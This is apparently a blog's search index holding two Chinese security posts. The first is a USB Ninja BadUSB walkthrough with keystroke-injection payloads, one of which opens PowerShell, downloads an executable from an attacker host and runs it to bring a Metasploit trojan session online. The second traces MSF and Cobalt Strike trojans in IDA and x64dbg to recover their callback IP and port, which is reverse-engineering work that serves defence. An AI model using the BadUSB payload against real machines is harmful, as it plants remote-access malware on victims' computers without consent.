<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>UsbNinja 物理黑客</title>
    <url>/2019/04/24/USB%20Ninja%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="什么是BadUsb"><a href="#什么是BadUsb" class="headerlink" title="什么是BadUsb"></a>什么是BadUsb</h1><p>其实最根本的原理就是模拟了键盘输入，利用了一个键盘控制芯片<br>因为可以接触到目标计算机了，因此直接插入目标计算机，让人防不胜防</p>
<h1 id="UsbNinja"><a href="#UsbNinja" class="headerlink" title="UsbNinja"></a>UsbNinja</h1><h2 id="图片展示"><a href="#图片展示" class="headerlink" title="图片展示"></a>图片展示</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/jpeg/26110731/1680336308287-aa6c12f5-ddb1-495c-ba1c-261c0738df15.jpeg#averageHue=%23383933&clientId=uca5575ce-27d6-4&from=paste&height=405&id=u8834ebde&originHeight=1280&originWidth=1280&originalType=binary&ratio=1&rotation=0&showTitle=false&size=87413&status=done&style=none&taskId=u90906851-a149-44a1-94f7-4dd9b305fc4&title=&width=405" alt="41d9b94b22f53736bab43fce970b630.jpg"></p>
<h2 id="操作原理"><a href="#操作原理" class="headerlink" title="操作原理"></a>操作原理</h2><p>3代USB ninja 拥有了蓝牙功能，如果资金不够，可以不买遥控器，直接使用手机蓝牙控制<br><code>[USBNinjaProfessional](https://github.com/USBNinjaRRG/USBNinjaProfessional)</code><br>手机控制apk下载链接 <a href="https://github.com/USBNinjaRRG/USBNinjaProfessional">https://github.com/USBNinjaRRG/USBNinjaProfessional</a><br>苹果直接在Apple Store中下载即可</p>
<hr>
<p>usb在插入后会自动创建一个蓝牙信号，利用手机的控制端连接该蓝牙即可控制<br>创建蓝牙信息<br><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1680336978029-980b4ec8-ea37-4e48-8119-356e3466c78a.png#averageHue=%23efefef&clientId=uca5575ce-27d6-4&from=paste&height=481&id=u31150ded&originHeight=950&originWidth=941&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45843&status=done&style=none&taskId=u8884d844-1029-4d33-a3b8-4632ada3180&title=&width=476" alt="image.png"><br>控制端<br><img src="https://cdn.nlark.com/yuque/0/2023/jpeg/26110731/1680338365012-22540578-30df-4e29-a88d-58a31820d1b2.jpeg#averageHue=%23f7f7f7&clientId=uca5575ce-27d6-4&from=paste&height=2532&id=u52d39944&originHeight=2532&originWidth=1170&originalType=binary&ratio=1&rotation=0&showTitle=false&size=113867&status=done&style=none&taskId=u2f443be2-50c4-48f7-b2ba-9301a64683a&title=&width=1170" alt="b29eae7b084df57492e46334992c4d2.jpg"><br>连接蓝牙<br><img src="https://cdn.nlark.com/yuque/0/2023/jpeg/26110731/1680338383199-f74607ec-a456-45dd-bede-25601876edcc.jpeg#averageHue=%23dddcdb&clientId=uca5575ce-27d6-4&from=paste&height=2532&id=u70ac5d47&originHeight=2532&originWidth=1170&originalType=binary&ratio=1&rotation=0&showTitle=false&size=160070&status=done&style=none&taskId=uf42c4410-6128-4dfa-8b60-afa2fd96e99&title=&width=1170" alt="b82ff86a0b1cceb046c3e4f70fb8868.jpg"><br>payload写法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1680336606208-40417893-3326-4488-b889-17a17220fee6.png#averageHue=%23e3bf81&clientId=uca5575ce-27d6-4&from=paste&height=988&id=uc9c63570&originHeight=988&originWidth=1301&originalType=binary&ratio=1&rotation=0&showTitle=false&size=79001&status=done&style=none&taskId=ud65ce758-e277-415e-b750-b0ba11f6c3b&title=&width=1301" alt="image.png"></p>
<hr>
<p>先放一个payload在这里，作用是在目标桌面创建一个名为1.txt的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gui d</span><br><span class="line">delay 500</span><br><span class="line">gui r</span><br><span class="line">delay 500</span><br><span class="line">string powershell</span><br><span class="line">delay 500</span><br><span class="line">enter</span><br><span class="line">Delay 500</span><br><span class="line">string cd desktop</span><br><span class="line">delay 500</span><br><span class="line">enter</span><br><span class="line">string echo hello &gt; hi.txt</span><br><span class="line">Delay 500</span><br><span class="line">Enter</span><br></pre></td></tr></table></figure>

<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="1-创建木马"><a href="#1-创建木马" class="headerlink" title="1.创建木马"></a>1.创建木马</h2><p>msfvenom生成木马<br><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1680339556580-46c66ff2-dbcd-4e70-8249-3fd47772c545.png#averageHue=%23e0be67&clientId=ufafc7408-2615-4&from=paste&height=322&id=u8f2ff74a&originHeight=322&originWidth=978&originalType=binary&ratio=1&rotation=0&showTitle=false&size=142289&status=done&style=none&taskId=uc827a33c-3d3a-47aa-9504-8454bed3074&title=&width=978" alt="image.png"></p>
<p>msfconsole 打开监听端<br><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1680339574784-11137de2-b8d5-425c-838e-4e516f40474a.png#averageHue=%23e5e2e2&clientId=ufafc7408-2615-4&from=paste&height=338&id=u663928ef&originHeight=338&originWidth=952&originalType=binary&ratio=1&rotation=0&showTitle=false&size=93300&status=done&style=none&taskId=u9f12fd37-008a-4956-a9ae-1f7da5396e4&title=&width=952" alt="image.png"></p>
<h2 id="2-写入payload"><a href="#2-写入payload" class="headerlink" title="2.写入payload"></a>2.写入payload</h2><p>Windows的powershell拥有wget功能</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gui d</span><br><span class="line">Delay 500</span><br><span class="line">gui r</span><br><span class="line">delay 500</span><br><span class="line">string powershell</span><br><span class="line">delay 500</span><br><span class="line">enter</span><br><span class="line">Delay 500</span><br><span class="line">String cd desktop</span><br><span class="line">Enter</span><br><span class="line">Delay 500</span><br><span class="line">String wget http://192.168.31.164:8000/a.exe -o a.exe</span><br><span class="line">Delay 1000</span><br><span class="line">Enter</span><br><span class="line">String .\a.exe</span><br><span class="line">Delay 500</span><br><span class="line">Enter </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="3-上线主机"><a href="#3-上线主机" class="headerlink" title="3.上线主机"></a>3.上线主机</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1680340105733-046e2838-52e8-43ec-9e67-7ba33d993c2a.png#averageHue=%23efe6d1&clientId=ufafc7408-2615-4&from=paste&height=918&id=u8dae9655&originHeight=918&originWidth=1918&originalType=binary&ratio=1&rotation=0&showTitle=false&size=656969&status=done&style=none&taskId=u32055085-57ff-4d03-8d67-15305e34e43&title=&width=1918" alt="image.png"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>物理渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>溯源CS_MSF木马</title>
    <url>/2023/04/24/%E6%BA%AF%E6%BA%90CS_MSF%E6%9C%A8%E9%A9%AC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-Linux-ELF文件分析"><a href="#1-Linux-ELF文件分析" class="headerlink" title="1.Linux ELF文件分析"></a>1.Linux ELF文件分析</h1><p>使用msf生成木马，然后拖进IDA工具进行分析<br>以下网站针对Linux_syscall函数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1677723862645-fcb1026d-a9e0-4211-a9b5-544a7ff689f7.png#averageHue=%23f3f2f1&clientId=u6d1ad6d1-e2f8-4&from=paste&height=262&id=u5b72a727&originHeight=262&originWidth=916&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71102&status=done&style=none&taskId=uff62912c-2201-48c8-a914-3d17f8e9764&title=&width=916" alt="image.png"><br>syscall使用<code>rax</code>寄存器进行参数调用<br><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1677723892468-885eb73a-f631-4956-8c35-f4fd3e33e2e0.png#averageHue=%2362b05d&clientId=u6d1ad6d1-e2f8-4&from=paste&height=379&id=u2aa3d0f9&originHeight=379&originWidth=875&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23144&status=done&style=none&taskId=u08c577bd-d860-448f-b6b7-4aed1cccf6d&title=&width=875" alt="image.png"><br><code>sys_connect</code> 总共调用了3个参数分别是 <code>fd</code>类型，<code>ip</code> 信息，<code>数据长度</code> 这边重点看rsi寄存器，可以看到<code>0A21FA8C00F270002</code>这段数据就是地址协议信息，因为是小端序的问题，将数据倒着看<br><code>0200270FC0A81FA200</code><br><code>0200</code>:AF_INET <strong>标注协议类型</strong><br><code>**270F**</code><strong>:9999</strong><br><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1677724417820-5396cbb9-8a88-4c91-81d6-03ac2a4b084b.png#averageHue=%23252d3a&clientId=u6d1ad6d1-e2f8-4&from=paste&height=749&id=ucf84c152&originHeight=749&originWidth=486&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40744&status=done&style=none&taskId=u3ae9338e-96da-4700-be04-3d2711b2087&title=&width=486" alt="image.png"><br><code>C0A81FA2</code>: 192 168 31 162</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">LOAD:<span class="number">00000000004000</span>AC                 mov     rcx, <span class="number">0</span>A21FA8C00F270002h</span><br><span class="line">LOAD:<span class="number">00000000004000B</span>6                 push    rcx</span><br><span class="line">LOAD:<span class="number">00000000004000B</span>7                 mov     rsi, rsp        ; uservaddr</span><br><span class="line">LOAD:<span class="number">00000000004000B</span>A                 push    <span class="number">10</span>h</span><br><span class="line">LOAD:<span class="number">00000000004000B</span>C                 pop     rdx             ; addrlen</span><br><span class="line">LOAD:<span class="number">00000000004000B</span>D                 push    <span class="number">2</span>Ah ; <span class="string">&#x27;*&#x27;</span></span><br><span class="line">LOAD:<span class="number">00000000004000B</span>F                 pop     rax</span><br><span class="line">LOAD:<span class="number">00000000004000</span>C0                 syscall                 ; LINUX - sys_connect</span><br><span class="line">LOAD:<span class="number">00000000004000</span>C2                 pop     rcx</span><br><span class="line">LOAD:<span class="number">00000000004000</span>C3                 test    rax, rax</span><br><span class="line">LOAD:<span class="number">00000000004000</span>C6                 jns     <span class="type">short</span> loc_4000ED</span><br><span class="line">LOAD:<span class="number">00000000004000</span>C8                 dec     r9</span><br><span class="line">LOAD:<span class="number">00000000004000</span>CB                 jz      <span class="type">short</span> loc_4000E5</span><br></pre></td></tr></table></figure>
<p>关于sockaddr sockaddr_in 结构体<br><a href="https://www.jb51.net/article/117902.htm">https://www.jb51.net/article/117902.htm</a></p>
<h2 id="Windows-CS木马分析"><a href="#Windows-CS木马分析" class="headerlink" title=".Windows CS木马分析"></a>.Windows CS木马分析</h2><p>针对dll文件分析，首先生成dll文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1677743855289-c4030b17-ede2-4425-ab23-799568d744b9.png#averageHue=%2392e0cf&clientId=u6d1ad6d1-e2f8-4&from=paste&height=918&id=u0d3f0a40&originHeight=918&originWidth=1710&originalType=binary&ratio=1&rotation=0&showTitle=false&size=538513&status=done&style=none&taskId=uf507f170-64ab-47bd-8b96-252bf07cbda&title=&width=1710" alt="image.png">常用dll手段一般是 白（exe）+黑（dll）<br>接下来直接拖到ida里面<br><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1677743938185-cbfcfa16-ace1-42ef-8a77-295f5b111290.png#averageHue=%23f8f7f7&clientId=u6d1ad6d1-e2f8-4&from=paste&height=780&id=u2aca5e33&originHeight=780&originWidth=1394&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43484&status=done&style=none&taskId=u48da0f13-ee4d-4125-bcea-d2ea9243324&title=&width=1394" alt="image.png"><br>CreateThread的第二个参数为函数运行的指针<br><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1677743995129-555f2ca0-ad5c-4203-b489-deac71dd230e.png#averageHue=%23fdfcfc&clientId=u6d1ad6d1-e2f8-4&from=paste&height=615&id=u5ac9c943&originHeight=615&originWidth=1404&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67150&status=done&style=none&taskId=u41bbeb57-5a8b-4be0-b87f-82e68980b87&title=&width=1404" alt="image.png"><br>发现程序又创建了一个指针然后又return <code>15B2</code>里面去了，继续跟进<br><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1677744048876-e4e9926a-b818-4fb2-b352-3ec22a7464cb.png#averageHue=%23fbfbfb&clientId=u6d1ad6d1-e2f8-4&from=paste&height=412&id=ubb14f0a3&originHeight=412&originWidth=920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29974&status=done&style=none&taskId=u710a1dd5-3ac8-4a0e-9c8f-d6df5c8e0b6&title=&width=920" alt="image.png"><br>这个页面猜测可能是程序又释放了一些文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1677744478102-11bc6442-15e0-46de-91c0-d6c05231b8bd.png#averageHue=%23f9f9f8&clientId=u6d1ad6d1-e2f8-4&from=paste&height=480&id=u0c823de5&originHeight=480&originWidth=1081&originalType=binary&ratio=1&rotation=0&showTitle=false&size=47132&status=done&style=none&taskId=udc4ecec0-a3f5-4ea3-93c1-2246ce23c4a&title=&width=1081" alt="image.png"><br>来到了这个页面，看到了常见的木马三部曲 创建内存区块 修改执行权限 创建线程<br>如果读取到了VirtualAlloc创建的内存，就可以得到真正程序执行的shellcode<br>x6dbg走起<br>首先运行<br>C:\Windows\System32\rundll32.exe 使用x64dbg调试即可<br>然后修改命令行为<br><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1677744645992-79fba62c-4271-4f04-a435-8e56dc70f888.png#averageHue=%23f1f0f0&clientId=u6d1ad6d1-e2f8-4&from=paste&height=184&id=u6dd7dece&originHeight=184&originWidth=834&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14284&status=done&style=none&taskId=u6f678db7-fc8c-46d5-8a1e-aa474ce86c3&title=&width=834" alt="image.png"><br>然后选项-&gt;事件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1677744692599-f28d8ebd-1c5d-4052-b952-6bc555932eaf.png#averageHue=%23eeeded&clientId=u6d1ad6d1-e2f8-4&from=paste&height=918&id=u07fdbe7f&originHeight=918&originWidth=766&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38544&status=done&style=none&taskId=uc201842a-6dd8-4d70-85f3-7f1defd8db9&title=&width=766" alt="image.png"><br>启动调试，否则程序会直接闪过去不在dll位置停止<br><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1677744763230-2b6e6da1-b93a-4495-90b4-1bb3c9b0834c.png#averageHue=%23ece5dc&clientId=u6d1ad6d1-e2f8-4&from=paste&height=1374&id=ued8c3a06&originHeight=1374&originWidth=2152&originalType=binary&ratio=1&rotation=0&showTitle=false&size=478914&status=done&style=none&taskId=ua554e60a-1b2a-4847-8fe5-a1fd95ff196&title=&width=2152" alt="image.png">在artifact.dll位置停下，已经到了dll加载的地址了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1677744869349-a5d7d80e-3cdc-485a-97c8-53034c650381.png#averageHue=%23fbfbfb&clientId=u89bb3935-4696-4&from=paste&height=706&id=u23e823a9&originHeight=706&originWidth=1207&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59252&status=done&style=none&taskId=uc8448576-e463-4e7c-afc9-be7bcd5487f&title=&width=1207" alt="image.png"><br>在该地址处断下<img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1677744906586-3f84acda-190a-41c5-affb-98bad1794003.png#averageHue=%23efe6da&clientId=u89bb3935-4696-4&from=paste&height=686&id=uac447e11&originHeight=686&originWidth=1776&originalType=binary&ratio=1&rotation=0&showTitle=false&size=175147&status=done&style=none&taskId=u11ee2e5c-35c7-4046-bbbd-8ecf5989372&title=&width=1776" alt="image.png"><br>可以简单的代码复原一下，这个就是一个while循环，中间又一个sleep函数，会影响调试器正常使用，使用nop指令填充即可<br><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1677744982554-f8e304d0-3724-46c5-8a40-7e3d58393fbd.png#averageHue=%23ece5dc&clientId=u89bb3935-4696-4&from=paste&height=1353&id=ude3ae3fe&originHeight=1353&originWidth=2160&originalType=binary&ratio=1&rotation=0&showTitle=false&size=421296&status=done&style=none&taskId=u92826d22-8e81-4775-a6fa-03bda2ed2e6&title=&width=2160" alt="image.png"><br>在<code>15F7</code>处下一个断点，然后进入<code>176E</code>在<code>1770</code>处下一个断点<br><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1677745211215-912025d1-daa3-487c-bba8-01a3b158fc86.png#averageHue=%23efe7df&clientId=u89bb3935-4696-4&from=paste&height=1234&id=uc2716f51&originHeight=1234&originWidth=2014&originalType=binary&ratio=1&rotation=0&showTitle=false&size=349796&status=done&style=none&taskId=uf3ade141-a6b8-4e75-abff-20ae7ee9975&title=&width=2014" alt="image.png"><br>然后继续运行程序<br><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1677746151119-49780e47-3749-454e-8294-4ae98e42b809.png#averageHue=%23efe7de&clientId=u89bb3935-4696-4&from=paste&height=1160&id=u18e405fc&originHeight=1160&originWidth=2130&originalType=binary&ratio=1&rotation=0&showTitle=false&size=373329&status=done&style=none&taskId=u4b738879-378c-4163-9573-2d26ee97218&title=&width=2130" alt="image.png"><br>在rax处得到VirtualAlloc创建的内存地址<br>在CreateThread前面下断点<br>在内存布局中转入到VirtualAlloc创建的内存地址<br><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1677746335298-43db3d5c-a1db-4321-911d-439ccd8dba19.png#averageHue=%23efe5db&clientId=u89bb3935-4696-4&from=paste&height=1160&id=u7b786f73&originHeight=1160&originWidth=2130&originalType=binary&ratio=1&rotation=0&showTitle=false&size=355161&status=done&style=none&taskId=u2366b32c-3cae-4f20-b9c3-6b223fcd6b4&title=&width=2130" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1677746362729-4da863fe-cf2b-48a3-b441-158802a7942e.png#averageHue=%23f7ede0&clientId=u89bb3935-4696-4&from=paste&height=1600&id=ue76c0255&originHeight=1600&originWidth=4480&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1935747&status=done&style=none&taskId=u8fc1e67d-0049-4d55-a3e5-2d9cf36d731&title=&width=4480" alt="image.png"><br>将导入的bin文件直接扔到ida里面去得到ip地址<br><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1677746740220-5b3671ab-aeeb-43eb-be89-ce83d1e986e5.png#averageHue=%23f7f6f5&clientId=u89bb3935-4696-4&from=paste&height=1166&id=u9c092608&originHeight=1166&originWidth=1577&originalType=binary&ratio=1&rotation=0&showTitle=false&size=161369&status=done&style=none&taskId=uc3f2757c-d64e-4bf2-9373-9ca76629016&title=&width=1577" alt="image.png"><br>端口为第271个byte处<br><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1677747171177-ee68e378-c272-492a-81c4-30add5e30dc1.png#averageHue=%23071423&clientId=u89bb3935-4696-4&from=paste&height=826&id=u7da69f93&originHeight=826&originWidth=1386&originalType=binary&ratio=1&rotation=0&showTitle=false&size=185479&status=done&style=none&taskId=u48ac64c3-668e-4582-95d5-3b6699aa805&title=&width=1386" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1677747183248-ab858e2f-a9c6-41ab-9809-486356761a4f.png#averageHue=%23242c38&clientId=u89bb3935-4696-4&from=paste&height=749&id=ufb2dae84&originHeight=749&originWidth=486&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42994&status=done&style=none&taskId=u8c4d4200-e004-4681-9e01-b78a07314a7&title=&width=486" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1677747198894-a6247149-e5a0-4397-a68d-2a688bb08e27.png#averageHue=%237edac7&clientId=u89bb3935-4696-4&from=paste&height=718&id=uf3396c11&originHeight=718&originWidth=1296&originalType=binary&ratio=1&rotation=0&showTitle=false&size=208485&status=done&style=none&taskId=u1f085713-7a3b-4344-a2d4-b824e9d995b&title=&width=1296" alt="image.png"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>逆向溯源</tag>
      </tags>
  </entry>
</search>
